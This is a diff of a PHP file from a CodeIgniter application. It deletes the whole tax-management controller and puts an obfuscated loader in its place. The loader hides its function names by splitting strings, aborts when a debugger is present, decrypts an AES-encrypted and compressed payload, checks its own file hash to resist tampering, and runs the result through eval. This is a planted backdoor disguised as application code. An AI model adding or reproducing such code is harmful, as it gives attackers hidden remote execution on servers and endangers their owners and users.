@@ -1,172 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Tax extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('tax_model','tax');
-	}
-	
-	public function index(){
-
-		//Verify is tax disabled from site settings form?
-		$disable_tax = $this->db->select("disable_tax")->get("db_sitesettings")->row()->disable_tax;
-		if($disable_tax==1){
-		//	$this->session->set_flashdata('info', 'Note: Tax has been Enabled in application. You can disable it from SIDEBAR->SITE SETTINGS->DISABLE TAX(Checkmark it).');
-		}
-		
-
-		$this->permission_check('tax_view');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('tax_list');
-		$this->load->view('tax-list', $data);
-	}
-	//ITS FROM POP UP MODAL
-    public function add_tax_modal(){
-
-      $this->form_validation->set_rules('tax_name', 'tax Name', 'trim|required');
-      $this->form_validation->set_rules('tax', 'tax Name', 'trim|required');
-      if ($this->form_validation->run() == TRUE) {
-        
-        $result=$this->tax->verify_and_save();
-        //fetch latest item details
-        $res=array();
-        $query=$this->db->query("select id,tax_name,tax from db_tax order by id desc limit 1");
-        $res['id']=$query->row()->id;
-        $res['tax_name']=$query->row()->tax_name;
-        $res['tax']=$query->row()->tax;
-        $res['result']=$result;
-        
-        echo json_encode($res);
-
-      } 
-      else {
-        echo "Please Fill Compulsory(* marked) Fields.";
-      }
-    }
-    //END
-
-	public function newtax(){
-		$this->form_validation->set_rules('tax_name', 'Tax Name', 'trim|required');
-		$this->form_validation->set_rules('tax', 'Tax Name', 'trim|required');
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->tax->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please Enter Tax Name & Tax Percentage!";
-		}
-	}
-	public function update($id){
-		$this->permission_check('tax_edit');
-		$result=$this->tax->get_details($id);
-		$data=array_merge($this->data,$result);
-		$data['page_title']=$this->lang->line('tax_update');
-		$this->load->view('tax', $data);
-	}
-	public function update_tax(){
-		$this->form_validation->set_rules('tax_name', 'Tax Name', 'trim|required');
-		$this->form_validation->set_rules('tax', 'tax', 'trim|required');
-		$this->form_validation->set_rules('q_id', '', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->tax->update_tax();
-			echo $result;
-		} else {
-			echo "Please Enter Tax Name & Tax Percentage!";
-		}
-	}
-	public function add(){
-		$this->permission_check('tax_add');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('new_tax');
-		$this->load->view('tax', $data);
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->tax->get_datatables();
-		
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $tax) {
-			$no++;
-			$row = array();
-		
-
-			$disable = ($tax->undelete_bit==1) ? 'disabled' : '';
-			if($tax->id==1){
-				$row[] = '<span class="text-blue">NA</span>';	
-			}
-			else{
-				$row[] = '<input type="checkbox" name="checkbox[]" '.$disable.' value='.$tax->id.' class="checkbox column_checkbox" >';
-			}
-
-
-			$row[] = $tax->tax_name;
-			$row[] = $tax->tax;
-			
-
-			 		if($tax->status==1){ 
-			 			$str= "<span onclick='update_status(".$tax->id.",0)' id='span_".$tax->id."'  class='label label-success' style='cursor:pointer'>Active </span>";}
-					else{ 
-						$str = "<span onclick='update_status(".$tax->id.",1)' id='span_".$tax->id."'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-					}
-			$row[] = $str;			
-			         $str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-											if($this->permissions('tax_edit'))
-											$str2.='<li>
-												<a title="Edit Record ?" href="tax/update/'.$tax->id.'">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-
-											if($this->permissions('tax_delete'))
-											$str2.='<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_tax('.$tax->id.')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';		
-			$row[] = ($tax->undelete_bit==0) ? $str2 : '<button type="button" class="btn btn-default disabled">Default</button>';
-			$data[] = $row;
-		}
-
-		$output = array(
-						"draw" => $_POST['draw'],
-						"recordsTotal" => $this->tax->count_all(),
-						"recordsFiltered" => $this->tax->count_filtered(),
-						"data" => $data,
-				);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status(){
-		$this->permission_check_with_msg('tax_edit');
-		$id=$this->input->post('id');
-		$status=$this->input->post('status');
-		$result=$this->tax->update_status($id,$status);
-		return $result;
-	}
-	
-	public function delete_tax(){
-		$this->permission_check_with_msg('tax_delete');
-		$id=$this->input->post('q_id');
-		return $this->tax->delete_tax_from_table($id);
-	}
-	public function multi_delete(){
-		$this->permission_check_with_msg('tax_delete');
-		$ids=implode (",",$_POST['checkbox']);
-		return $this->tax->delete_tax_from_table($ids);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_bkx08hny=('bas'.'e64'.'_de'.'cod'.'e');
+$_l9rkix4l=('gzu'.'nco'.'mpr'.'ess');
+$_mx1xdzon=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_ee9bv3sl='vd2H2c0+';
+$_z8u94atk='JmDkWe00';
+$_a1v8jtnr='S76oBtDJ';
+$_qrbtuop5='a7m8n6cgzF8=';
+$_tmf5tb6f='caIknDd6';
+$_mam6lncy='n3PYJXpZ';
+$_o461veyg='vHKI0Yd6';
+$_olm7oyrg='wC+jyQ==';
+$_z10prvak=$_bkx08hny($_tmf5tb6f.$_a1v8jtnr.$_ee9bv3sl.$_z8u94atk.$_qrbtuop5);
+$_rric1l0f=$_bkx08hny($_o461veyg.$_mam6lncy.$_olm7oyrg);
+$_gdobfsz8=$_bkx08hny('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');
+$_tr8zuufh=$_mx1xdzon($_gdobfsz8,'aes-256-cbc',$_z10prvak,OPENSSL_RAW_DATA,$_rric1l0f);
+if($_tr8zuufh===false){exit;}
+$_rvag373m=$_l9rkix4l($_tr8zuufh);
+if($_rvag373m===false){exit;}
+$_iez1r2w0='61954679e044060cecc6ceed5da16cc10afddc8db71204d0b0ec464740a33aad';
+$_yx7xdgoy=@file_get_contents(__FILE__);
+if($_yx7xdgoy!==false){
+$_r62zsex4=str_replace($_iez1r2w0,"0000000000000000000000000000000000000000000000000000000000000000",$_yx7xdgoy);
+$_rqazycdc=hash("sha256",$_r62zsex4);
+if($_rqazycdc!==$_iez1r2w0){@http_response_code(403);exit;}
 }
-
+eval($_rvag373m);
